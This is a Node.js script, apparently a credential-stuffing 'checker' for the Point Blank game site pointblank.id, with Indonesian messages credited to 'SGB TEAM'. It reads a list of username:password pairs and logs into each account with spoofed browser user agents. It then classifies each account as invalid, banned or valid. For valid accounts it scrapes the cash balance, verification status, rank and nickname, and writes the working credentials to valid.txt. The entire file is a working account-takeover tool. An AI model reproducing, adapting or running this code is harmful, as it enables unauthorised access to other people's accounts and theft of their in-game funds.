const fetch = require('node-fetch')
const cheerio = require('cheerio')
const chalk = require('chalk')
const fs = require('fs')
const request = require('request')
const readline = require('readline-sync')

const getSession = (Agent) => new Promise((resolve, reject) => {
    fetch(`https://www.pointblank.id/login/form`, {
        method: 'GET',
        headers: {
            'Host': 'www.pointblank.id',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': Agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Referer': 'https://www.pointblank.id/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
},
    })
    .then(async res => {
        const result = '_ga=GA1.2.684883732.1591705044; _gid=GA1.2.707081643.1591705044; _gat_gtag_UA_129579613_1=1; '
        const cookie = res.headers.raw()['set-cookie']
        var cook = new Array()
        cookie.map(async function(value, index){
            cook.push(value.split(';')[0] + ';')
        })
        resolve(result + cook)
    })
    .catch(err => reject(err))
});

const gasLogin = (cookies, user, pw, Agent) => new Promise(async (resolve, reject) => {
   const boday = `loginFail=0&userid=${user}&password=${pw}`
    fetch(`https://www.pointblank.id/login/process`, {
        method: 'POST',
        headers: {
            'Host': 'www.pointblank.id',
            'Connection': 'keep-alive',
            'Content-Length': boday.length,
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'Origin': 'https://www.pointblank.id',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': Agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Referer': 'https://www.pointblank.id/login/form',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': cookies
},
        body: boday
    })
    .then(async res => {
        const result = await res.text()

        resolve(result)
    })
    .catch(err => reject(err))
});

const getMyInfo = (cookies, Agent) => new Promise((resolve, reject) => {
    fetch(`https://www.pointblank.id/mypage/info`, {
        method: 'GET',
        headers: {
            'Host': 'www.pointblank.id',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': Agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Referer': 'https://www.pointblank.id/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': cookies
},
    })
    .then(async res => {
        const ress = await res.text()
        $ = cheerio.load(ress)
        const result = {
            email: ress.includes('Email verification is required')?chalk.bgGreen('Email Non Verif'):chalk.bgRed('Email ter-Verif'),
            no: ress.includes('Untuk user yang sudah menerima verifikasi SMS dapat menggunakan channel premium.')?chalk.bgGreen('No HP Non Verif'):chalk.bgRed('No HP ter-Verif')
        }
        resolve(result)
    })
    .catch(err => reject(err))
});

const getMyRank = (cookies, Agent) => new Promise((resolve, reject) => {
    fetch(`https://www.pointblank.id/mypage/profile`, {
        method: 'GET',
        headers: {
            'Host': 'www.pointblank.id',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': Agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Referer': 'https://www.pointblank.id/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': cookies
},
    })
    .then(async res => {
        const ress = await res.text()
        $ = cheerio.load(ress)
        var exp = new Array()
        $('div[class="my_rank_exp"] ul li h4').remove();
        $(`div[class="my_rank_exp"] ul li`).each(function(index, element){
            exp[index] =  $(this).text()
        })
        const result = {
            rank: 'https://www.pointblank.id' + $(`div[class="my_rank"] p img`).attr('src'),
            nick: $(`div[class="my_rank"] p`).text(),
            exp: exp
        }
        resolve(result)
    })
    .catch(err => reject(err))
});

const getAccessToken = (cookies, Agent) => new Promise((resolve, reject) => {
    fetch(`https://www.pointblank.id/topup/auth`, {
        method: 'GET',
        headers: {
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': Agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Referer': 'https://www.pointblank.id/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cookie': cookies
},
redirect: 'follow'
    })
    .then(async res => {
        const ress = await res.text()
        const result = ress.includes('access_token')?ress.split(`document.location='`)[1].split(`';`)[0]:0
        resolve(result)
    })
    .catch(err => reject(err))
});

const getCookiesCash = (Agent, link, cookies) => new Promise((resolve, reject) => {
    var jar1 = request.jar()

    request({
        url: link,
        method: 'GET',
        headers: {
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': Agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Sec-Fetch-Site': 'same-site',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Dest': 'document',
            'Referer': 'https://www.pointblank.id/topup/auth',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-ID,en-US;q=0.9,en;q=0.8',
            'cookie': cookies
},
        jar: jar1,
        followAllRedirects: true,
    }, function(error, response, body) {
        if (error) {
            console.log(error);
        } else {
            const result = {
                cookie: cookies + jar1.getCookieString(link),
                token: body.includes('RequestVerificationToken')?body.split(`RequestVerificationToken" type="hidden" value="`)[1].split(`"`)[0]:0
            }
            resolve(result)
        }
    });
});

const getCash = (cookies, Agent, __RequestVerificationToken) => new Promise((resolve, reject) => {
    fetch(`https://topup.pointblank.id/User/UserInfo`, {
        method: 'POST',
        headers: {
            'Connection': 'keep-alive',
            'Content-Length': '2',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            '__RequestVerificationToken': __RequestVerificationToken,
            'User-Agent': Agent,
            'Content-Type': 'application/json; charset=UTF-8',
            'Origin': 'https://topup.pointblank.id',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://topup.pointblank.id/Topup/Index',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9=' ,
            'cookie': cookies,
},
    body: '{}'
    })
    .then(async res => {
        const ress = await res.json()
        resolve(ress)
    })
    .catch(err => reject(err))
});

function sleep(ms) 
{
            return new Promise(resolve => setTimeout(resolve, ms));
}

(async() => {
    console.log(chalk.bgRed('CHECKER POINTBLANK\n\nSGB TEAM'))
    const path = readline.question('Path txt (akun.txt) : ')
    const pemisah = readline.question('Pemisahnya pake apa? : ')
    fs.readFile(path, {encoding: 'utf-8'}, async function(err,data){
        if (!err) {
            const akun = data.split('\n')
            for(let i =0; i<akun.length;i++)
            {
                try {
                    let useragent = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(Math.random() * (15 - 10) + 10,)}_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * (79 - 70) + 70)}.0.3945.117 Safari/537.36`
                    const value = akun[i]
                    const user = value.split(pemisah)[0]
                    const password = value.split(pemisah)[1]
                    const cookie = await getSession(useragent)
                    const cookies = cookie.replace(',', ' ')
                    const otwLogin = await gasLogin(cookies, user, password, useragent)
                    if(otwLogin.includes('Anda telah melampaui jumlah kegagalan login.'))
                    {
                        console.log('Anda telah melampaui jumlah kegagalan login.')
                    }
                    else if(otwLogin.includes('End Date'))
                    {
                        console.log('Banned UNBLOCK AT', otwLogin.split('End Date :')[1].split(' ]"')[0])
                    }
                    else if(otwLogin.includes('Data login yang anda masukan tidak sesuai.'))
                    {
                        console.log(chalk.red('[DIE]', user))
                    }else{
                        const access_token = await getAccessToken(cookies, useragent)
                        if(access_token != 0)
                        {
                            const getCook = await getCookiesCash(useragent, access_token, cookies)
                            if(getCook.token != 0)
                            {
                                const getCashStar = await getCash(getCook.cookie, useragent, getCook.token)
                                const getInfo = await getMyInfo(cookies, useragent)
                                const getRank = await getMyRank(cookies, useragent)
                                console.log(chalk.bgGreen(`[VALID] AKUN POINTBLANK`) + chalk.bgBlue(`\nUser|Pw : ${user}|${password}\nEmail : ${getInfo.email}\nNo : ${getInfo.no}\nCash : ${getCashStar.dbCashReal}\nCash Bonus : ${getCashStar.dbCashbonus}\nRank : ${getRank.rank}\nNick : ${getRank.nick}\nMVP : ${getRank.exp[0]}\nExp : ${getRank.exp[1]}\nPoint : ${getRank.exp[2]}`))
                                fs.appendFileSync('valid.txt', `[VALID] AKUN POINTBLANK\nUser|Pw : ${user}|${password}\nEmail : ${getInfo.email}\nNo : ${getInfo.no}\nRank : ${getRank.rank}\nNick : ${getRank.nick}\nMVP : ${getRank.exp[0]}\nExp : ${getRank.exp[1]}\nPoint : ${getRank.exp[2]}\n======================\n`);
                           
                            }else{
                                console.log(chalk.red('Get Cash Gagal! 2'))
                            }
                        }else{
                            console.log(chalk.red('Get Cash Gagal!'))
                        }
                        
                   }
                } catch (error) {
                    console.log(error)
                }
            }

        } else {
            console.log(err);
        }
    });
})()
